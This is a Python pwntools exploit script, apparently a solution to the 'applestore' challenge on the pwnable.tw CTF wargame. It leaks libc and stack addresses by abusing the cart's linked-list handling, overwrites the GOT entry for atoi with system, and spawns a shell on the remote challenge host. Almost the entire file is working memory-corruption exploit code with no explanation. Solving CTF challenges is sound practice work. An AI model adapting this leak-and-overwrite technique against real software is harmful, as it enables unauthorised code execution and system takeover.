#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('applestore_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*checkout+48
        b*delete+100
        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10104
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10104)
else:
    p = process([exe.path])

def add(num):
    sna(b'> ', 2)
    sna(b'Device Number> ', num)

def delete(num):
    sna(b'> ', 3)
    sa(b'Item Number> ', num)

def list(a):
    sna(b'> ', 4)
    sa(b'et me check your cart. ok? (y/n) > ', a) 

def check():
    sna(b'> ', 5)
    sa(b'Let me check your cart. ok? (y/n) > ', b'y') 

def trigger():
    for i in range(20):
        add(2)

    for j in range(6):
        add(1)
    check()
        
trigger()

load = flat(
    b'y'*2,
    exe.got.atoi,
    1,
    0,
    0,
)

list(load)
ru(b'27: ')
libc_leak = u32(r(4))
libc.address = libc_leak - libc.sym.atoi
main_arena = 0x1b07b0 + libc.address

info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

load = flat(
    b'27',
    libc.sym.environ,
    0x1C06,
    0,
    exe.sym.myCart
)

delete(load)

ru(b'Remove 27:')
stack_leak = u32(r(4))
info(f'stack leak: {hex(stack_leak)}')
rip = stack_leak-0xc0
ebp  =stack_leak -0x104

trigger()
GDB()
load = flat(
    b'27',
    main_arena,
    0x1C06,
    exe.got.atoi-8+0x22,
    ebp-0x8,
)

delete(load)

sa(b'> ', b'/bin/sh\0' + p32(libc.sym.system))

p.interactive()
